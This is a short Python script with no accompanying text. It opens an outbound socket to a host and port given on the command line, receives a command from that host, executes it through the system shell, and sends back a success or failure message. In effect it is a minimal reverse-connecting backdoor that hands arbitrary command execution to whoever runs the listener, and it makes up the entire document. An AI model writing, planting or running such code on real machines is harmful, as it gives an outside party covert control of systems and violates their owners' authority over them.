import socket
import sys

from subprocess import Popen, PIPE

HOST = sys.argv[1]
PORT = int(sys.argv[2])

with socket.create_connection((HOST, PORT)) as sock:
    command = sock.recv(1024).decode()

    process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
    
    if process.wait() == 0:
        sock.send(b"Done!\n")
    else:
        sock.send(b"Can't do that.\n")
